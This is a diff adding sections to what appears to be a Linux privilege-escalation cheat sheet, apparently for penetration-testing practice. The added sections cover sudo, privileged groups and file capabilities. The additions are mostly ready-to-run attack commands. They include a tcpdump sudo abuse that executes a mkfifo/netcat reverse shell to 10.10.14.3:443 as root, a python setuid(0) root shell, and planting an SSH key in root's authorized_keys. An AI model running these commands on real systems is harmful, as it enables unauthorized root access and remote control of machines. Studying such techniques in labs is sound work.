@@ -14,8 +14,6 @@ for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'
 # Sudo Version
 sudo -V
 
-# 
-
 # Hosts
 cat /etc/hosts
 
@@ -134,4 +132,65 @@ done
 bash.sh
 #!/bin/bash
 id
+```
+
+# Sudo Rights Abuse
+```powershell
+sudo -l
+
+(root) NOPASSWD: /usr/sbin/tcpdump
+
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+cat /tmp/.test
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+
+nc -lnvp 443
+```
+
+# Privileged Groups
+```powershell
+Privileged Groups:
+root
+sudo
+wheel
+docker
+lxd
+shadow
+disk
+kmem
+mem
+port
+adm
+systemd-journal
+tty
+audio/video
+
+grep -v -E '^#' /etc/group | grep -E ':.*(root|sudo|docker|lxd|disk|shadow)'
+id
+groups
+
+cat /etc/group | grep istifadəçi_adı
+getent group | grep istifadəçi_adı
+```
+
+# Capabilities
+```powershell
+getcap -r / 2>/dev/null | grep --color=always -E 'cap_sys_admin|cap_setuid|cap_setgid|cap_dac_override|cap_sys_ptrace|cap_sys_module|cap_sys_chroot|$'
+
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+cap_setuid+ep | cap_setgid+ep
+/yol/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+cap_dac_override+ep
+/yol/tapılan_fayl cat ~/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
+ssh root@localhost
+
+cap_sys_admin+ep
+mkdir /tmp/rootfs
+/yol/tapılan_fayl mount /dev/sda1 /tmp/rootfs
+cd /tmp/rootfs/etc/
 ```
